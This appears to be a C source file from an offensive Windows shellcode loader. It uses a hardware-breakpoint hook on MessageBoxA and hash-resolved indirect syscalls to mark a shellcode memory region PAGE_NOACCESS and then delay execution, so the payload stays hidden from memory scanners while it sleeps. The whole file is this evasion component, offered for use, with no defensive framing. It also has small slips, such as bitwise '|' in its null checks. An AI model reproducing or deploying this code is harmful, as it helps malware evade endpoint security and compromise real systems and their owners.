#include "../indirect_syscall.h"
#include "../typedefs.h"
#include "../debug/debug.h"
#include "hook_functions.h"
#include "hwbp.h"


PVOID	_G_pScAddress;
HANDLE	_G_hProcess;
SIZE_T	_G_sSize;
ULONG	_G_dwProtection;

NTAPI_FUNC _G_NTFUNC;

BOOL set_scaddress(HANDLE hProcess, PVOID pScAddress, SIZE_T sSize, ULONG dwProtection) {
	if (hProcess == NULL	|
		pScAddress == NULL	|
		sSize == 0			
		//dwProtection == 0
	) {
		return FALSE;
	}

	_G_hProcess = hProcess;
	_G_pScAddress = pScAddress;
	_G_sSize = sSize;
	_G_dwProtection = dwProtection;

	return TRUE;
}

// Jump function for WinAPI()
int __stdcall hook_MessageBox(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType) {
#ifdef DEBUG				   
	PRINTA("\t[!HOOK!] Entered hook function !\n");
	PRINTA("\t[+HOOK+] Modifying shellcode memory block to PAGE_NOACCESS\n");
#endif

	NTSTATUS STATUS = NULL;
	LARGE_INTEGER DelayInterval = { 0 };
	DelayInterval.QuadPart = WAITTIMER;

	// This call was already obtained so we can just call it 
	// Call NtProtectVirtualMemory and set PAGE_NOACCESS to the shellcode memory block
	SET_SYSCALL(_G_NTFUNC.NtProtectVirtualMemory);
	if ((STATUS = RunSyscall(_G_hProcess, &_G_pScAddress, &_G_sSize, PAGE_NOACCESS, &_G_dwProtection)) != 0x00) {
#ifdef DEBUG
		PRINTA("\t[!HOOK!] NtProtectVirtualMemory Failed With Status : 0x%0.8X\n", STATUS);
#endif
		return -1;
	}

#ifdef DEBUG
	PRINTA("\t[!HOOK!] NtProtectVirtualMemory Succeeded With Status : 0x%0.8X\n", STATUS);
	//system("pause");
#endif

#ifdef DEBUG
	PRINTA("\t[!HOOK!] Removing HWBP from Sleep\n");
#endif
	// Unset the HWBP on MessageBoxA and continue execution
	HWBP(NtCurrentThread(), (DWORD64)&MessageBoxA, FALSE);

#ifdef DEBUG
	PRINTA("\t[+HOOK+] Sleeping for %d\n", DelayInterval.QuadPart);
#endif

	// Get syscall info
	if (!ObtainSyscall(NTDELAYEXECUTION_HASH, &_G_NTFUNC.NtDelayExecution)) {
		return -1;
	}
	// Delay execution further by some time
	SET_SYSCALL(_G_NTFUNC.NtDelayExecution);
	if ((STATUS = RunSyscall(FALSE, &DelayInterval)) != 0x00) {
#ifdef DEBUG
		PRINTA("\t[!HOOK!] NtDelayExecution Failed With Error: 0x%0.8X \n", STATUS);
#endif
		return -1;
	}

#ifdef DEBUG
	PRINTW(L"\t[*HOOK*] NtDelayExecution slept for ->  %d\n", DelayInterval.QuadPart);
#endif

#ifdef DEBUG
	PRINTA("\t[+HOOK+] Done ! Continue\n");
#endif
	return 0;

}